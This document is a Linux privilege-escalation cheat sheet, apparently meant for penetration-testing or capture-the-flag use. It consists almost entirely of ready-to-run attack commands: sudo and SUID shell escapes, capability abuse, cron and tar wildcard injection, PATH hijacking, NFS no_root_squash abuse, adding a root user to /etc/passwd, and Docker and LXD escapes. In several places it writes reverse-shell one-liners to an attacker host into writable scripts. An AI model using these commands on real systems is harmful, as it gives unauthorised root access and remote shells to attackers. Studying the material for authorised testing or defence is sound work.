# === SUDO EXPLOITATION ===
# Check sudo rights first - NOPASSWD on any binary = game over
sudo -l
# If a binary appears - check GTFOBins for sudo tab specifically
# Common instant wins:
sudo find . -exec /bin/bash \; -quit
sudo vim -c ':!/bin/bash'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo less /etc/passwd
# LD_PRELOAD abuse - only works if env_keep+=LD_PRELOAD in sudoers
# Compile on target: gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so {{SUDO_BINARY}}

# === SUID EXPLOITATION ===
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Check each against GTFOBins SUID tab - technique differs from sudo tab
# Common wins:
/usr/bin/find . -exec /bin/bash -p \; -quit
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
/usr/bin/vim -c ':py3 import os; os.execl("/bin/bash","bash","-p")'
# Note: bash SUID only exploitable if binary itself has SUID, not scripts
/bin/bash -p

# === CAPABILITIES ===
getcap -r / 2>/dev/null
# cap_setuid = privesc via interpreter
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# cap_dac_read_search = read any file
./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# === CRON JOB ATTACKS ===
cat /etc/crontab
ls -la /etc/cron.*
# Run pspy to catch hidden cron jobs
./pspy64
# If cron runs a writable script as root
echo '#!/bin/bash\nbash -i >& /dev/tcp/{{KALI}}/{{KALI_PORT}} 0>&1' > /path/to/script.sh
chmod +x /path/to/script.sh
# Wildcard injection - if cron runs tar * in writable dir
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=bash shell.sh'
echo '#!/bin/bash\nbash -i >& /dev/tcp/{{KALI}}/{{KALI_PORT}} 0>&1' > shell.sh
chmod +x shell.sh

# === WRITABLE SYSTEMD SERVICES ===
# Find writable service files
find /etc/systemd/system /lib/systemd/system -type f -writable 2>/dev/null
# Or writable ExecStart binary
grep -R "ExecStart" /etc/systemd/system /lib/systemd/system 2>/dev/null
# If writable - replace ExecStart with reverse shell, then trigger restart
systemctl daemon-reload && systemctl restart {{SERVICE}}

# === PATH HIJACKING ===
# Only works if a root/cron/sudo process calls a binary without full path
echo $PATH | tr ':' '\n'
# If /tmp or home dir is early in PATH
echo '#!/bin/bash\nbash -i >& /dev/tcp/{{KALI}}/{{KALI_PORT}} 0>&1' > /tmp/{{BINARY}}
chmod +x /tmp/{{BINARY}}
export PATH=/tmp:$PATH

# === NFS NO_ROOT_SQUASH ===
# On Kali - check exports
showmount -e {{TARGET}}
# If no_root_squash is set - mount and SUID a shell
mkdir /tmp/nfs && mount -t nfs {{TARGET}}:/ /tmp/nfs
cp /bin/bash /tmp/nfs/tmp/bash
chmod +s /tmp/nfs/tmp/bash
# On target
/tmp/bash -p

# === /ETC/PASSWD WRITABLE ===
ls -la /etc/passwd
# Generate hash
openssl passwd -6 abc123
echo 'root2:$6$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2

# === DOCKER GROUP ESCAPE ===
ls -la /var/run/docker.sock
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# If no internet - use existing image
docker images
docker run -v /:/mnt --rm -it {{IMAGE}} chroot /mnt sh

# === LXD GROUP ESCAPE ===
lxc list
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

# === KERNEL EXPLOITS (LAST RESORT - noisy/unstable) ===
uname -a
./linux-exploit-suggester-2.pl
searchsploit linux kernel {{KERNEL_VERSION}}
# Only attempt if all other vectors exhausted
